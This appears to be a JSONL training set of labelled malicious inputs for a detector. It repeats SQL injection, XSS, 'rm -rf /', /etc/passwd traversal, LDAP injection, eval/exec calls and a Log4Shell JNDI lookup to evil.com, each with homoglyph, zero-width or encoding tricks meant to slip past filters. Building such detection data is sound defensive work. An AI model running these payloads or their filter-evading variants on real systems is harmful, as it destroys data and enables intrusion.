+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP TаBLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP TABLе users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP\\x20TABLE\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm\\x20-rf\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rM -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import os; os.systеm('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "impоrt os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import\\x20os;\\x20os.system('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "еxec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exeс('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "exec('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
